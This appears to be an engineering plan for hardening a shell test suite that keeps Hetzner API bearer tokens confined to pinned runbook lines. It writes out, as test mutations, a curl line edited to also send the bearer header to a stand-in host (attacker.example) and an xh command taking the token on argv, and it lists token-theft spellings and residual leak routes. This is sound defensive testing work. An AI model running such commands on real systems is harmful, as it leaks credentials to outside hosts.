---
title: "fix(sole-copy suite): freeze runbook 6604's verify lines and catch a Hetzner token handed to a non-curl client (N3b residuals)"
type: fix
date: 2026-11-13
slug: fix-n3b-census-6604-verify-lines-and-token-client
branch: feat-one-shot-12683-n3b-census
issue: 12683
closes: 12683
priority: p3-low
domain: engineering
lane: single-domain
brand_survival_threshold: none
---

# fix(sole-copy suite): freeze runbook 6604's verify lines and catch a token handed to a non-curl client

## Enhancement Summary

**Deepened on:** 2026-11-13. **Reviewers:** security-sentinel, test-design-reviewer, a verify-the-negative pass, and the
CTO, who ruled every fork they raised (see `decision-challenges.md`).

- **Verify-the-negative:** every factual negative claim is confirmed. The p5 needles occur only at 6894:357, 6894:415
  and SKILL:506. Runbook 6604 is not censused. The AC3 selector matches 6 base lines. No stale references to cut rows.
- **Correctness fix (F1):** the V3 `seg` cut is now the LAST occurrence of `$N3B_V3_URL | jq `. New row gVr12 pins the
  direction.
- **New rows:** gVr13 (V3 `?` is literal), H-i/H-j (green controls for `_h18_vbld`), g5s1 (near-miss silent row), and
  `H18_ROWS` row-count conservation (CTO: ACCEPT). g5r2/g5r4 now use the write token. g5r8's continuation has no indent,
  and p5 rows pin their start line with `_h18_at`. `_h18_fs` rejects a `frozen:` line from any other key.
  `_h18_vbld` reports `(misplaced)`.
- **Declared, not built (CTO):** flags are permitted but not required (follow-up #12752); the V tail after ` | jq` is
  pinned only by the literal; Doppler spellings beyond the five exact needles; `--name-transformer` renames. The
  per-kind URL arm is defence in depth.
- **Process:** replays run the worktree's own suite path. AC7 states why `FLOOR`/`TABLE_ROWS` stay put. AC12 filters on
  main's `headSha`. Added the `## Observability` section (probe: a `git grep -c` of the frozen heredocs, `:5`).

## Overview

Close the two P3 gaps the final verification pass of PR #12645 left in row N3b of the sole-copy drift suite
(`plugins/soleur/test/sole-copy-drift-check.test.sh`). Both gaps are recorded as items 5 and 6 of the archived plan's
attack-surface list. Neither is a regression of #12645.

1. **Runbook 6604's verify lines.** `rb_expected` builds the three "Verify the retired end state" lines V2, V3 and V4
   inline (`servers/123931471 | jq -c`, `"volumes?name=..." | jq -c`, `volumes/<web1-pin> | jq`). N3 checks them only
   against that builder. No frozen literal binds them and the defence lists never run on them. Appending
   ` https://attacker.example/` after `servers/123931471` in both the suite line and runbook 6604 is expected to leave the
   suite at 286/286 (Phase 0 replays it, AC1), while `--config -` sends the bearer header to both hosts.
2. **A token passed to another client.** Census arm p4 needs `curl` or `Authorization` beside the token name, and p3 needs
   the literal host. So `doppler run ... --only-secrets HCLOUD_TOKEN_READONLY ... -- sh -c 'xh -A bearer -a
   "$HCLOUD_TOKEN_READONLY" "$U"'` in a fenced block of runbook 6894 leaves the suite at 286/286 with the token on xh's
   argv.

The fix follows the CTO rulings of 2026-11-13 (binding brief, plus six implementation rulings in
`knowledge-base/project/specs/feat-one-shot-12683-n3b-census/decision-challenges.md`). (a) V2-V4 get the protection D and
R already have: a frozen literal each in a quoted heredoc, checked by `n3b_frozen_self`, and the four defence checks on the
built line and the literal, with the curl-argv allow-list keyed per line kind. (b) A case-sensitive census arm p5 flags a
logical line holding any of five token spellings. Every change goes in the suite file. The work is red first: both
reported mutations are shown to leave the suite green before the fix and to turn it red after.

## Research Reconciliation — Spec vs. Codebase

| Claim (issue / brief) | Reality (measured 2026-11-13) | Plan response |
| --- | --- | --- |
| "the defence lists do not run on them" | Confirmed, and they *could not*: in a scratch prototype `n3b_lists` with today's `N3B_END` rejects all three real V lines as `(no volume-id end)` | The per-kind end anchor is required, not optional (ruling (a), F2) |
| "today a grep finds that text only on the D and R lines" | Confirmed: the five p5 needles occur in runbook 6894 only at lines 357 (D) and 415 (R), and in the postmerge skill only at 506 (R) | p5 is silent on the real documents; prototype measured |
| The xh line "stays 286/286" | Confirmed: prototype census without p5 prints nothing for it; with p5 it prints `unclassified p5:` at its line | Red-first row g5r1 |
| "Appending ... stays 286/286" | Not yet replayed. Baseline is 286/286 (`=== Results: 286/286 passed, 0 failed ===`, run 2026-11-13 on 1d77ede350) | Phase 0 replays it in a sandbox worktree before the fix (F6) |
| The xh line goes in "a fenced block of runbook 6894" | The destroy section's fence is checked for exact equality to D (`destroy-fence:`), so a line added there goes red for the wrong reason | Rows put the xh line in the section-5c fence, after R, which no fence-equality check reads, so only the census can catch it |

## Research Insights

### Premise validation

- #12683 is open. #12616 is closed and #12645 merged 2026-11-12T09:25Z (its N3b is the code this extends). #9927 and
  #12272 are open; their operator holds stand and nothing here touches them.
- Collision pre-check (`collision-precheck.sh 12683`, exit 10): the one PR naming #12683 is #12741, this branch's own
  draft PR. The foreign `test-all.sh` processes belong to the worktree of #11076, an unrelated issue. No duplicate.
- Every cited symbol exists at HEAD 1d77ede350: `rb_expected` (suite :2146), `rb_line_readback`/`rb_line_get404`
  (:2140-2145), `n3b_census` (:2208), `N3B_FROZEN_D/R` (:2256-2262), `n3b_frozen_self` (:2264), `N3B_END` (:2279),
  `n3b_lists` (:2280), `n3b_builder` (:2310), `n3b` (:2318), and the H18 battery (:2725-2918).
- The archived plan that records the limits is
  `knowledge-base/project/plans/archive/20261111-225500-2026-11-11-security-runbook-6894-destroy-readback-stdin-header-plan.md`.
  "Limits 5 and 6" are items 5 and 6 of its `### Attack Surface Enumeration` list (:532 and :546).
- ADR corpus: the mechanism (an exact-text pin plus frozen literals) is the one ADR-282 / #12645 already chose. No ADR rejects
  it, and the change makes no new architectural decision.

### Property list

1. P1: An edit to a V2, V3 or V4 line that adds a second URL, a credential on curl's argv or an environment dump goes red,
   even when it is made to the suite builder and to runbook 6604 together, so N3 stays green.
2. P2: Each V line is bound to a frozen literal that is not built from `RB_WRAP`, `RB_HDR` or any `rb_line_*` builder. An
   edit to the builder alone goes red.
3. P3: When the literal is also edited, the four defence checks still run on it. The curl-argv allow-list admits only the
   flags the V lines use and only that kind's own URL shape.
4. P4: In runbook 6894 and the postmerge skill, any logical line that names the token as `$HCLOUD_TOKEN`, `${HCLOUD_TOKEN`,
   `--only-secrets HCLOUD`, `--only-secrets=HCLOUD` or `secrets get HCLOUD` must equal D or R.
5. P5: Prose that names the token without those spellings (bare `HCLOUD_TOKEN`, `HCLOUD_TOKEN_READONLY`) stays legal.
6. P6: Both reported mutations are shown green before the fix and red after it, inside the suite and by a replay.
7. P7: Items 5 and 6 of the archived plan describe the state after this change, and the renamed-token gap stays recorded.

### Cut list

- A new N-row assertion for the V lines: cut. It would buy P1-P3 at the cost of moving `FLOOR` (286). The V checks run
  inside `n3b`, so they ride on the N3b assertion, and their rows ride on the H18 assertion. `FLOOR` and `TABLE_ROWS` stay
  286 and 149.
- A second copy of the curl-argv word loop for V kinds: cut by ruling F2. The existing loop gets a kind-selected anchor
  and a kind-guarded URL arm.
- An edit to runbook 6604's prose at :1244 ("The suite's row N3 pins this line, and the four of ..."): cut. It stays true,
  because N3 still reads `rb_expected`.
- Matching bare `HCLOUD_TOKEN`: cut by ruling (b). The bare name occurs in the prose of runbook 6894 (:360, :424-:432) and
  of the postmerge skill (:516-:523).

### Relevant learnings

- `knowledge-base/project/learnings/2026-11-11-a-census-keyed-on-the-client-name-missed-every-call-split-across-lines.md`:
  N3b's own precursor. Drive rows through the real entry point (`n3b`), never a helper alone, and require a positive
  `seen` line.
- `.../2026-11-10-a-closed-allow-list-that-pins-names-leaves-the-deny-list-one-level-down.md`: allow-lists of names leak.
  That is why the frozen literal is the closure and the lists are defence in depth.
- `.../2026-11-03-a-registration-pin-must-close-the-neighbourhood-not-list-the-spellings.md`: p5 is a spelling list.
  The CTO ruled it anyway. Its residual (a renamed token, a token read by name without `$`, such as `printenv NAME`) is
  recorded in limit 5 and is not presented as closed.
- `.../2026-07-20-adding-a-second-copy-of-a-guarded-literal-disarms-the-first.md`: three new literals sit beside D/R. Each
  is checked by key (`N3B_FROZEN_<key>`), never by a whole-file presence grep.
- `.../2026-11-04-a-live-red-proof-has-no-free-baseline-...md`: a red proof needs its own green baseline on the unmutated
  tree. Phase 0 records it (286/286 above).
- `.../2026-10-18-sole-copy-drift-check-fixes-were-the-least-audited-surface.md`: re-derive `FLOOR` from a green run.
  This plan adds no assertion, and AC7 checks that the realized count is still 286.

### CI and guards

- The suite runs in CI through `bash scripts/test-all.sh scripts` (`.github/workflows/ci.yml:1935`), found by
  `SUITE_GLOBS` (`plugins/soleur/test/*.test.sh`). The baseline run took about 4.5 minutes locally.
- `.claude/hooks/grep-q-pipe-guard.test.sh` reads this suite's text and pins `PJ_TRIPLES=344`. A new `| <verb>` pipe
  producer/verb pair can turn it red, so run it after the edit (AC9). The new code uses only verbs the suite already pipes
  to (`_h18_red`, `grep`).
- `lint-skill-body-budget` (`python3 scripts/lint-skill-body-budget.py --base "$(git merge-base origin/main HEAD)"`) and
  `plugin-root-anchoring` (`cd apps/web-platform && npx vitest run test/plugin-root-anchoring.test.ts`) scan skills and
  commands. No skill is edited, so both should pass trivially, and the brief requires both to run.
- Plan lints (`lint-guard-contract.py`, `lint-infra-no-human-steps.py`) skip `plans/archive/`, so editing the archived
  plan is lint-safe. Nothing else reads it.

### Plan review (2026-11-13)

Panel: DHH, Kieran and code-simplicity, plus the CTO on a devex lens. A separate scoped advisor consult and a
sharp-edges verification pass also ran. Applied, as mechanical fixes:

- R1 is confined to one function body, with each target file required to differ by exactly one line. On the fixed
  tree, `N3B_FROZEN_V2` holds the same text, so a file-wide sed would have made AC5 fail (DHH, Kieran, CTO).
- The `@ID@` placement checks run before `n3b_frozen_self`'s value-equality arm. Otherwise any edited copy would mask
  them (Kieran).
- The V `case` sits in an `if`/`else` that leaves the D/R lines at their column, and the V URL arms set `key=url`.
- The V3 URL is matched as a fixed string from one constant.
- The `both` literals use the `rb_line_v<k> @ID@` idiom.
- The F4 want strings take an append-only `_h18_v` suffix.
- `_h18_red` is rewritten as ERE.
- Phase 2 keeps the `_n3b=` line and the fs-self control on D/R until Phase 3, and expects fs-V rows to report
  `(did-not-land)`.
- The fix is WIP-committed before the replay.
- Added: gVr11, fs-r-unquoted, the `builder-only` mode of H-d, and a maintenance comment above `rb_expected`.
- Cut as duplicates of the F4-extended rows or of the real-document baseline: five V rows, g5r7, H-h, half of AC3 and
  the fs half of H-g.
- Merged Phases 3a and 3b into one fix phase.

Two optional CTO devex advisories were declined. They are recorded as taste rows in `decision-challenges.md`.

### Functional overlap

`soleur:engineering:discovery:functional-discovery` found no community skill or agent that does this. The general
mutation-testing and secret-scanner skills were judged not to fit. Nothing was installed.

## Proposed Solution

### Part (a): V2-V4 bound like D and R

1. **Builders.** Extract the three inline lines of `rb_expected` into `rb_line_v2 <web1-pin>`, `rb_line_v3` (it takes no
   id; any argument is ignored) and `rb_line_v4 <web1-pin>`, each built from `RB_WRAP$RB_HDR`, the same way `rb_line_get404`
   is. `rb_expected` calls them, so N3 binds runbook 6604 to exactly the text the new checks inspect. One suite constant,
   `N3B_V3_URL='"https://api.hetzner.cloud/v1/volumes?name=soleur-web-platform-data"'`, feeds `rb_line_v3`, the V3 end
   anchor and the V3 allow-list word. The frozen literal still writes it out by hand, since the literal is what must stay
   independent.
2. **Frozen literals.** Add `N3B_FROZEN_V2`, `N3B_FROZEN_V3` and `N3B_FROZEN_V4`, each written out byte for byte in a
   quoted heredoc (`<<'N3B_EOF'`) beside D and R, with `@ID@` the only placeholder:
   - V2: `... --max-time 30 https://api.hetzner.cloud/v1/servers/123931471 | jq -c ".server.volumes"'   # expect [@ID@]`.
     The server id is a literal, and the single `@ID@` sits only in `expect [@ID@]`.
   - V3: `... --max-time 30 "https://api.hetzner.cloud/v1/volumes?name=soleur-web-platform-data" | jq -c "[.volumes[].id]"'   # expect []`.
     It holds no `@ID@`.
   - V4: `... --max-time 30 https://api.hetzner.cloud/v1/volumes/@ID@ | jq ".volume.protection.delete"'   # expect true after the SSH-stage apply`.
3. **Source check.** Add `n3b_frozen_all <suite-file>`, which loops `n3b_frozen_self` over `D R V2 V3 V4`. Three callers use
   it, so the rows pin the key list: the `_n3b=` line, the clean-file control (the `spurious:fs-self` line under the fs
   rows), and `_h18_fs`. `_h18_fs <label> <awk> <key> <reason>` runs `n3b_frozen_all` on the copy and requires a line that
   starts `builder <key>: frozen:` and contains `<reason>`, and no `builder <other-key>: frozen:` line (deepen A9: an awk
   program that hits several heredocs cannot pass; one key may print more than one line, e.g. fs-v3-id). It never calls `n3b_frozen_self` with a key. `n3b_frozen_self`
   also checks `@ID@` placement (CTO concern 2), on `$body` and *before* its `case`, so the value-equality arm (which fires
   on any edited copy) cannot mask it. Each failure prints its own message, `builder <key>: frozen: @ID@ placement: ...`.
   The rules: D, R, V2 and V4 hold exactly one `@ID@`, V2's is inside `expect [@ID@]`, and V3 holds none.
4. **Per-kind curl-argv** (ruling F2). Inside the one `n3b_lists`:
   - Select the end anchor by kind. D and R keep `N3B_END`, byte-identical. V2 uses
     `N3B_END_V2='^(.*https://api\.hetzner\.cloud/v1/servers/[0-9]+) [|] jq '` and V4 uses
     `N3B_END_V4='^(.*https://api\.hetzner\.cloud/v1/volumes/[0-9]+) [|] jq '`. V3 matches as a fixed string,
     `[[ "$a" == *"$N3B_V3_URL | jq "* ]]` with `seg` cut at the LAST occurrence of that string,
     `seg=${a%"$N3B_V3_URL | jq "*}$N3B_V3_URL` (deepen F1: when the pair occurs twice, a first-occurrence `%%` cut would leave
     every word after the first pair outside curl-argv), so no `.` or `?` can act as a
     wildcard (CTO concern 3). The V2/V4 regex anchors are greedy `^(.*URL)`, so they bind the last match already. The no-anchor message names the kind: D and R keep ` (no volume-id end)`, and V kinds print
     ` (no <K> URL end)`.
   - Control-flow shape (Kieran, DHH). In the word loop, put `if [[ "$k" == V* ]]; then` on a new line before the existing
     `case "$o" in`. That branch holds a V `case` at its own indentation, then `else`. The D/R `case ... esac` lines stay
     untouched at their column, and a new `fi` line follows the existing `esac`. The `seen` check and `i=$((i + 1))` tail
     stay after `fi`, so the at-most-once check covers V words. Prototyped by Kieran: D/R lines stay byte-identical and
     AC3 prints `1`.
   - The V `case` admits only `--disable`, `-sS`, `--noproxy "*"`, `--config -` and `--max-time 30` (F1: `-o` and `-w`
     are rejected), and only the kind's own URL word, with `key=url` set: V2 `https://api.hetzner.cloud/v1/servers/<digits>`,
     V3 exactly `"$N3B_V3_URL"` (a quoted pattern, so `?` is literal), V4 `https://api.hetzner.cloud/v1/volumes/<digits>`.
     Its `*)` arm rejects every other word. A V word never reaches the D/R `volumes/*` arm.
   - The slots, residual, quote-join, `$`/backquote, at-most-once and env-dump checks apply to V lines unchanged. The
     prototypes show all three real V lines pass them.
   - **A missing anchor is red.** When the anchor does not match (a word between the URL and ` | jq`, as in the #12683
     exploit), `seg` becomes the whole remainder, so every word after the URL (`https://attacker.example/`, `|`, `jq`, ...)
     fails the allow-list. The line prints `curl-argv:`. Measured in the prototypes for the after, before and cross-kind
     shapes.
5. **Dispatch** (ruling F3). `n3b` takes a 5th argument, `<web1-pin>`. Its `slot:` early return also fires when that pin
   is empty or equals `<pin>` or `<retired>`. After the D/R builder calls, it runs
   `n3b_builder V2 "$(rb_line_v2 "$5")" "$N3B_FROZEN_V2" "$5"`, and the same for V3 and V4. Every caller passes `$_wpin`:
   the `_n3b=` line, `_h18_judge`, `_h18_silent`, `_h18_bld`, g1b8 and the H-b loop.
6. **Reduction** (CTO concern 1). Rewrite both `s` commands of `_h18_red` as ERE: `sed -nE 's/^builder (D|R|V[234]):
   ([a-z-]*): (quote-join):.*/\1:\2:\3/p; s/^builder (D|R|V[234]): ([a-z-]*):.*/\1:\2/p'`. This avoids GNU-only `\|` in
   a basic regex.
7. **`both` literals and the F4 want strings.** In `_h18_bld`'s `both` mode, set `N3B_FROZEN_V2=$(rb_line_v2 @ID@)`, and the
   same for V3 and V4. This is the existing D/R idiom, so no pin is ever replaced back by text substitution. The F4 rows
   keep main's D/R want literal byte for byte and append a suffix from a required helper:
   `'D:frozen R:frozen'"$(_h18_v frozen)"`, where `_h18_v <check>...` prints ` V2:<c> V3:<c> V4:<c>` per check in
   `LC_ALL=C` order. D < R < V, so the joined string stays sorted. The `git diff` of each row is then an appended suffix,
   with no separate golden step. A row whose V tags differ from its D/R tags writes them out explicitly.
8. **Maintenance pointer** (CTO devex). Above `rb_expected`, add a comment listing what to edit when a V line legitimately
   changes, in order: runbook 6604's block, `rb_line_v<k>` (and `N3B_V3_URL` for the V3 name), `N3B_FROZEN_V<k>`, and the
   H18 rows whose A text names the old value. It also says which red to expect when one is missed. N3 then names
   `rb_cmdline_ok`, and N3b names `builder V<k>: frozen: ... at byte N`.

### Part (b): census arm p5

In `n3b_census`'s `flush()`, after p4 and before `if (p == "") return`, add one line:

```awk
if (p == "" && (index(j, "$HCLOUD_TOKEN") || index(j, "${HCLOUD_TOKEN") || index(j, "--only-secrets HCLOUD") || index(j, "--only-secrets=HCLOUD") || index(j, "secrets get HCLOUD"))) p = "p5"
```

It reads the joined logical line `j`, not the folded `l`, so the match is case-sensitive (ruling (b)). It fires only when
p1-p4 did not, so every existing row keeps its tag (Kieran traced each one). Update the comment block above `n3b_census`,
which today calls another client a "plan limit 5" gap. Name p5 there, and name the residual that remains: a renamed
token, or a token read by name without `$`, such as `printenv HCLOUD_TOKEN_READONLY`. Case-sensitivity is declared, not
pinned by a row (code-simplicity): `doppler run --name-transformer` can inject the token under another name, which is
limit 5 (deepen F5, CTO). A p5 clause on `--name-transformer` was rejected: runbook 6894's `tf()` wrapper uses it and
would turn the base red.

### Documentation

- Archived plan, item 5: state that p5 now closes the "token name passed to another client" case for the five
  spellings, cite H18 row g5r1, and keep the renamed-token gap and the new no-`$` read-by-name gap recorded. Item 5 also
  names only `N3B_FROZEN_D`/`N3B_FROZEN_R`, so it gains the three V literals.
- Archived plan, item 6: state that V2-V4 are now frozen and run the defence lists with the per-kind allow-list, so the
  second-URL edit is red. Cite rows gVr1/gVr2. Keep "Other runbooks are out of scope". Keep the remaining gaps: a literal
  edited together with its builder and runbook still faces only the defence lists, and 6604's prose outside its two
  pinned blocks is not censused. Add the two new declarations: the flags are permitted but not required (#12752), and
  the V tail after ` | jq` is pinned only by the literal (env-dump is an open list).
- Archived plan, item 5 also records the Doppler-spelling and `--name-transformer` residuals from item 3 above.
- Suite comments, found by content anchor (line numbers move as the phases add lines): the header phrase
  `runbook-6894/postmerge exact-text pin`, the comment starting `# N3b (#12616, CTO ruling 4)`, the comment starting
  `# n3b_builder (CTO rulings 11c and 12a)`, the comment block under `_h18_bld() {`, and the census comment holding
  `(plan limit 5)`. Each names V2-V4 and p5. The N3b and H18 pass messages gain one clause each naming the V lines and p5.

## Implementation Phases

Each suite run takes about 4.5 minutes. Run it in the background and wait on its `=== Results` line. The two replays
of a phase can run at the same time, since `TMP` comes from `mktemp -d` and `REPO_ROOT` from the script path. Use a
temporary WIP commit, never a stash.

### Phase 0: baseline and replay (red-first evidence, F6)

1. Baseline: `bash plugins/soleur/test/sole-copy-drift-check.test.sh` prints `=== Results: 286/286 passed, 0 failed ===`
   (measured 2026-11-13 on 1d77ede350).
2. Write two content-anchored edit scripts in the scratchpad. They are not patches, because a patch taken here no longer
   applies after Phase 1:
   - **R1 (second URL).** In the suite it edits only one function's body: `rb_expected` on the base tree, and
     `rb_line_v2` on the fixed tree. It uses `sed '/^<fn>() {/,/^}/ s#servers/123931471 | jq -c#servers/123931471 https://attacker.example/ | jq -c#'`.
     In `workspaces-luks-cutover-6604.md` it makes the same `#`-delimited substitution. It then asserts three things:
     each of the two files differs from its source in exactly one line (`diff src new | grep -c '^>'` is `1`), and on the
     fixed tree the `N3B_FROZEN_V2` heredoc body is byte-identical before and after.
   - **R2 (xh line).** It inserts the issue's xh line after the R line inside runbook 6894's section-5c fence. The awk
     reads R through `ENVIRON` (`N3B_R="$r" awk 'BEGIN { a = ENVIRON["N3B_R"] } ...'`), never `-v`, which would read
     R's backslashes as escapes. It asserts that the runbook differs in exactly one line.
3. Run R1 and R2 each on its own throwaway worktree of HEAD (`git worktree add --detach <scratchpad>/r1 HEAD`), invoking
   that worktree's own copy, `bash "$WT/plugins/soleur/test/sole-copy-drift-check.test.sh"` (`REPO_ROOT` comes from the
   script path, so the live tree's copy would replay the wrong tree). Plain detached worktrees are the isolation; the
   suite needs no allocator because `TMP` is `mktemp -d`. Record each edit script's one-line `diff` counts and the N3
   `pass:` line beside the total (deepen A7). Expect
   286/286 from both. Remove the worktrees (`git worktree remove --force`).

### Phase 1: pure extraction (green)

Extract `rb_line_v2`/`rb_line_v3`/`rb_line_v4` and `N3B_V3_URL`, and make `rb_expected` call them. Nothing else changes.
Run the suite: 286/286.

### Phase 2: new H18 rows (red)

Add every row in the Guard Contract matrices, `_h18_vbld`, `_h18_v`, the instrument controls, the `_h18_red` rewrite and
`n3b_frozen_all`. Update callers to pass `$_wpin` as the 5th argument, which `n3b` ignores at this point. Two things stay
on D/R until Phase 3: the `_n3b=` line and the `spurious:fs-self` control both keep calling `n3b_frozen_self` for D and
R. Otherwise N3b reds on `no N3B_FROZEN_V2 heredoc`, `_n3b_ok` drops to 0, and H18 prints `H18 not judged` instead of
naming rows. The F4 want strings also keep main's form until Phase 3, so the red is caused only by the new rows.

Run the suite. H18 must FAIL. Its line names `uncaught:gVr1(`, `uncaught:gVr2(`, `uncaught:g5r1` and the other new
Guard 1 and Guard 2 rows. Match each label with its `(` or a trailing space, so `gVr1` cannot match `gVr11`. The fs-V
rows report `fs-v*(did-not-land)`, since their heredoc anchor lines do not exist yet. Every pre-existing row stays
caught. Save the FAIL line in the PR body.

### Phase 3: the fix (green)

Add the frozen V literals and switch the `_n3b=` line and the fs-self control to `n3b_frozen_all`. Add the `@ID@`
placement checks, the per-kind anchors and V `case`, the `n3b` V dispatch, the `both` V-literal idiom, the F4 suffixes,
the maintenance comment and p5. Run the suite: 286/286.

### Phase 3c: replay on the fixed tree (red)

WIP-commit the fix first: a detached worktree checks out committed code only, so an uncommitted fix would replay the
unfixed suite. Run R1 and R2 on two worktrees of that commit. R1 makes N3b FAIL naming `builder V2: frozen:` and
`builder V2: curl-argv:`, while N3 stays `pass:`. That is the point: only the new check sees it. R2 makes N3b FAIL naming
`unclassified p5:`.

### Phase 4: documents and guards

Edit items 5 and 6 of the archived plan and the suite comments and pass messages listed above. Run the full guard set in
the Acceptance Criteria. Do not merge while main CI is red on encryption-posture. Never edit the encryption-posture ledger.

## Files to Edit

- `plugins/soleur/test/sole-copy-drift-check.test.sh`: builders, frozen literals, `n3b_frozen_self`/`n3b_frozen_all`,
  `n3b_lists`, `n3b`, `n3b_census` (p5), the H18 rows and helpers, comments and pass messages.
- `knowledge-base/project/plans/archive/20261111-225500-2026-11-11-security-runbook-6894-destroy-readback-stdin-header-plan.md`:
  items 5 and 6 of `### Attack Surface Enumeration`.

## Files to Create

- `knowledge-base/project/specs/feat-one-shot-12683-n3b-census/decision-challenges.md` (already written at plan time; the
  work phase only appends to it).
- `knowledge-base/project/specs/feat-one-shot-12683-n3b-census/tasks.md`.

## Open Code-Review Overlap

None. Searched 95 open `code-review` issues for the suite path, `sole-copy-drift-check`, the archived plan's basename,
`workspaces-luks-cutover-6604.md` and `inngest-luks-cutover-6894.md`.

## Technical Considerations

### Attack Surface Enumeration

How a read-only Hetzner bearer can leave these documents, after this change:

1. **A second destination on a V line** (#12683 item 1). Closed twice. A builder-only edit fails the frozen equality. An
   edit to the builder, the literal and the runbook together fails curl-argv, because the kind's end anchor must
   directly precede ` | jq` and every word before it must be on the kind's allow-list.
2. **A token handed to a non-curl client** (#12683 item 2). Closed for the five spellings by p5, in both documents, on
   logical lines.
3. **Remaining, declared (limit 5):** a renamed token, including one injected under another name by
   `doppler run --name-transformer` (`lower-snake`, `tf-var`); a token read by name without `$` or `${`
   (`printenv HCLOUD_TOKEN_READONLY | xh ...`); any Doppler spelling other than the five exact needles (flag order,
   whitespace, quoting, comma lists, e.g. `secrets get --plain HCLOUD_...`), and any Doppler read that names no secret
   (`secrets download`, `run` with no `--only-secrets`); same-line quote concatenation of the host beside a renamed
   token (deepen F4/F5, CTO: DECLARE). Any of
   these would be new text in a reviewed diff.
4. **Remaining, declared (limit 6):** the frozen literals are edited by a reviewed diff the suite cannot see. Other
   runbooks are out of scope. Runbook 6604 itself is not walked by the census: its two pinned blocks are exact text under
   N3, so any extra line there (an xh line included) is red, but a bearer command in 6604's *prose* outside those blocks
   is seen by neither N3 nor p5. That was true before this change too, and the archived plan's item 6 keeps it declared.
   Also declared here (deepen F2/F3, CTO: DECLARE): the allow-list permits `--disable`, `--noproxy "*"` and `--config -`
   but does not require them, for any kind (follow-up #12752); and the V tail after ` | jq` is pinned only by the frozen
   literal, since env-dump is an open word list.

### Why no Encryption Posture, IaC, Task Design or ADR section

The change edits a test suite and an archived plan. It adds no server code, no `plugins/*/scripts/` code, no store, no
connection, no infrastructure, no autonomous task surface, and no architectural decision (it extends ADR-282's exact-text
pin within its own design). The C4 model is unaffected: no actor, system, container or relationship changes.

## Observability

The only runtime surface is the suite itself, run in CI. It touches no server, host or Sentry path, so the signal is the
CI check and its log. The probe counts the frozen heredocs in the suite. It prints `...:2` on main today and must print
`...:5` after the fix. It is a single `git grep`, well under Check 10's 15-second cap, and it never runs the suite.

```yaml
liveness_signal:
  what: the sole-copy drift suite runs on every PR via scripts/test-all.sh (glob plugins/soleur/test/*.test.sh)
  cadence: per-PR and per-push CI run
  alert_target: the failing required CI check on the PR, plus the main-health-monitor sweep on main
  configured_in: scripts/test-all.sh (the plugins/soleur/test/*.test.sh registration) and .github/workflows/ci.yml
error_reporting:
  destination: GitHub Actions check status (no Sentry; this is a test suite, not runtime code)
  fail_loud: the suite prints "=== Results: N/286 passed, K failed ===" with K > 0, names the failing row (N3b or H18), and exits non-zero
failure_modes:
  - mode: a V2-V4 line or its frozen literal gains a second destination or a non-allow-listed curl word
    detection: N3b curl-argv check fails, naming the kind (no V<k> URL end) or the extra word
    alert_route: red CI check on the PR
  - mode: a Hetzner token spelling ($HCLOUD_TOKEN, ${HCLOUD_TOKEN, --only-secrets HCLOUD, --only-secrets=HCLOUD, secrets get HCLOUD) appears on a logical line that is not D or R
    detection: n3b_census arm p5 fails, naming the file and line
    alert_route: red CI check on the PR
  - mode: a frozen literal is unquoted, names a builder, or loses its @ID@ placement
    detection: n3b_frozen_self fails with its named reason
    alert_route: red CI check on the PR
logs:
  where: GitHub Actions job log for the test-all.sh scripts group
  retention: GitHub Actions default log retention (90 days)
discoverability_test:
  command: git grep -c "^IFS= read -r -d '' N3B_FROZEN_" -- ':(glob)plugins/soleur/**/sole-copy-drift-check.*'
  expected_output: ":5"
```

## Guard Contract

### Guard 1 — N3b binds runbook 6604's verify lines V2-V4 like D and R

**Property.** For each kind K in {V2, V3, V4}, the line `rb_line_<k>` builds must equal `N3B_FROZEN_<K>` (with `@ID@` set
to the web1 pin). N3 requires runbook 6604's verify block to hold that line byte for byte. Both texts must pass slots,
residual, curl-argv (K's own allow-list and end anchor) and env-dump.

**Assembly.**

- **The chokepoint is `n3b`.** It is the one entry point that calls `n3b_builder` for all five kinds. Every H18 row
  reaches the checks through it, so deleting any one `n3b_builder` call leaves that kind's rows uncaught: V2 by gVr1/gVr2,
  V3 by gVr4, V4 by gVr5/gVr6.
- **The single source of the text is `rb_line_v2/v3/v4`** (plus `N3B_V3_URL`). `rb_expected` (N3) and `n3b` both call
  them. The per-row precondition (F5) checks this: the row's runbook-6604 copy, edited the same way, must still pass
  `rb_cmdline_ok` under the overridden builder.
- **The literals are the three heredocs.** `n3b_frozen_all` checks the key list `D R V2 V3 V4` from the suite file's own
  text, and the fs rows pin each key: fs-unquoted (D, existing), fs-r-unquoted, fs-v2-url, fs-v3-id and fs-v4-unquoted.
- **The slot is `_wpin`,** from the workflow's `web1` row, passed explicitly as `n3b`'s 5th argument.

**Mutation matrix.** Rows 1-7 run through `_h18_vbld <label> <want> <built|both|builder-only> <K> <A> <B>`. A and B are
written in `@ID@` form. In a subshell, the helper:

1. computes `t=$(rb_line_<k> @ID@)`, then `t2=${t//"$A"/"$B"}`;
2. overrides `rb_line_<k>` to print `${t2//@ID@/$1}`;
3. in `both` mode, sets `N3B_FROZEN_<K>=$t2`;
4. except in `builder-only` mode, edits a runbook-6604 copy on the one verify line whose text after its leading whitespace
   equals the real `rb_line_<k> "$_wpin"`, asserting that exactly one line differs (otherwise it reports
   `<label>(misplaced)`, as `_h18_placed` does, never caught);
5. prints `@@precondition@@` if `rb_cmdline_ok "$copy" "$_wpin"` fails;
6. runs `n3b ... "$_wpin" | _h18_red`.

The caller maps `@@precondition@@` to `<label>(precondition)`, and otherwise compares the reduction with `<want>`
exactly.

| # | Row | Mutation | Expected |
| --- | --- | --- | --- |
| 1 | gVr1 | V2, built: ` https://attacker.example/` after `servers/123931471` (the #12683 exploit; precondition holds) | RED `V2:curl-argv V2:frozen` |
| 2 | gVr2 | the same edit, `both` (literal edited too) | RED `V2:curl-argv` |
| 3 | gVr4 | V3, both: `"$N3B_V3_URL"` replaced by `https://api.hetzner.cloud/v1/volumes/@ID@` (V4's kind) | RED `V3:curl-argv` |
| 4 | gVr5 | V4, both: `volumes/@ID@ |` replaced by `servers/123931471 |` (V2's kind) | RED `V4:curl-argv` |
| 5 | gVr6 | V4 only, both: `-o /dev/null` after `--max-time 30` (legal on D/R; a second member after a compliant V2 and V3) | RED `V4:curl-argv` |
| 6 | gVr11 | V2, both: a second allow-listed word, `https://api.hetzner.cloud/v1/servers/1 ` before the real URL (it pins `key=url` on the V arm) | RED `V2:curl-argv` |
| 7 | existing g1r14, g1m1-m5, g1b1-b7, g1b9 | the shared `RB_WRAP`/`RB_HDR` edits (F4), now with the `_h18_v` suffix | RED with each row's D/R checks repeated for V2, V3 and V4. g1b8 stays `R:curl-argv R:frozen` |
